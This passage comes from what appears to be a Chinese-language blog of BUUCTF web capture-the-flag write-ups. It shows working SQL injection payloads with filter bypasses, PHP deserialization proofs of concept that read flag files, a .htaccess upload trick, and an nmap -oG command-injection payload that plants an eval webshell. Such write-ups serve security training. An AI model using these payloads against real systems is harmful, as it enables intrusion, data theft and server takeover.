class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便注册一个用户，view.php?no=1存在注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=-1/**/union/**/select/**/1,(select/*1*/group_concat(data)/*1*/from/**/users),3,4</span><br></pre></td></tr></table></figure><p>可以发现data字段存放的就是序列化字符串，在使用的时候应该就会调用进行data字段进行反序列化操作</p><p>而且根据报错这里也知道了绝对路劲是/var/www/html/</p><p>构造反序列化POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">"file:///var/www/html/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$res = <span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="keyword">echo</span> serialize($res)</span><br></pre></td></tr></table></figure><p>根据之前的注入可知，有回显的是第二位，也就是username字段，data对应应该就是第四个字段为，将反序列化字符串尝试以注入的方式写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select/**/1,2,3,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"mochu";s:3:"age";i:7;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span></span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>用户名输入单引号之后报错，简单测试一下and or这些被过滤掉了<br>使用^异或符号替换and</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,user(),0x7e))^<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>等号也被过滤了，等号可以使用like来代替，空格使用()括号来代替<br>获取表名 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema)like%27geek%27),0x7e))^<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)<span class="built_in">where</span>(table_name)like%27H4rDsq1%27),0x7e))^<span class="string">'</span></span><br></pre></td></tr></table></figure><p>本来想用mid、substr函数的，但是被过滤了，换right函数输出后面的flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,(select(group_concat(right(password,13)))from(H4rDsq1)),0x7e))^<span class="string">'1</span></span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p> 返回包里面有一串加密字符串，使用base32+base64进行解密得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>题目描述里面将密码进行了md5加密，所以可以猜测后端的代码是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'username'</span>]==’admin’)&#123;</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">'password'</span>]==md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> “wrong pass!”;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="keyword">echo</span> “wrong user!”;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里考核的一个知识点是：</p><p>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据。<br>即输入admin，密码设置为123456，将123456MD5加密后放进union select 查询中</p><p>也就是当name代入查询查询时，在MySQL里面就会生成用户名为admin，密码为123456 MD5加密后的虚拟的数据，同时我们用123456密码进行登录，就能够绕过限制。</p><p>最后的payload为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username栏：<span class="string">' union select 1,"admin","e10adc3949ba59abbe56e057f20f883e";#</span></span><br><span class="line"><span class="string">password栏：123456</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf/3.png" alt=""></p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型绕过op，php://filter读取文件，<br>is_valid()两种绕过方式<br>(1). p神在小密圈内曾经发过一个点就是在反序列化时，将s改为S，此时后面的字符串支持16进制表示，因此我们的0x00就可以改写为\00，因为在is_valid中是将我们序列化后的字符串逐个转为ascii然后进行对比，而因此\00会被解析为三个字符，且都在允许的范围内，因此可以成功绕过<br>(2). 这道题因为出题人的php版本较高，前面的绕过还可以用php7.2+的黑魔法，public属性直接反序列化就能用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"><span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$A=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$B=serialize($A);</span><br><span class="line"><span class="keyword">echo</span> $B;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。<br>用法: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line">HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">';</span></span><br><span class="line"><span class="string">handler FlagHere open;</span></span><br><span class="line"><span class="string">handler FlagHere read first;</span></span><br><span class="line"><span class="string">handler FlagHere close;#</span></span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>文件类型为image/jpeg<br>可以上传.htaccess文件和jpg文件 </p><p>先上传一下.htaccess文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf/4.jpg" alt=""><br>再上传图片马<br><img src="../../images/ctf/buuctf/5.jpg" alt=""></p><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>WEB-INF/web.xml泄露</p><p>WEB-INF主要包含一下文件或目录:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure><p>漏洞成因  </p><blockquote><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p></blockquote><p>WEB-INF/web.xml<br><img src="../../images/ctf/buuctf/6.jpg" alt=""><br>看到</p><p>com.Wm.ctf.FlagController<br>关键路径<br>根据前文：</p><p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p><p>我们结合tomcat的项目存放路径经验试试下载FlagController.class试试<br>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a>   </p><p>利用escapeshellarg()+escapeshellcmd()的两次转义，导致闭合单引号后即可执行任意参数，然后利用Nmap的-oG参数写入shell<br><img src="../../images/ctf/buuctf/7.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=1&amp;id[]=2</span><br><span class="line">post:passwd=1234567a</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h1><p>cve-2020-7066<br>get_headers()会截断URL中空字符后的内容</p><p>这是在php7.3中发现的 ，但是一直有这个漏洞</p><p>测试脚本显示这会让恶意脚本获取意外域名的header 。这些header可能泄露敏感信息或者意外地包含攻击者控制的数据。  </p><p>测试脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// user input</span></span><br><span class="line">$_GET[<span class="string">'url'</span>] = <span class="string">"http://localhost\0.example.com"</span>;</span><br><span class="line"></span><br><span class="line">$host = parse_url($_GET[<span class="string">'url'</span>], PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span> (substr($host, <span class="number">-12</span>) !== <span class="string">'.example.com'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$headers = get_headers($_GET[<span class="string">'url'</span>]);</span><br><span class="line">var_dump($headers);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.123%00www.ctfhub.com</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p><code>.git</code>泄露 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight 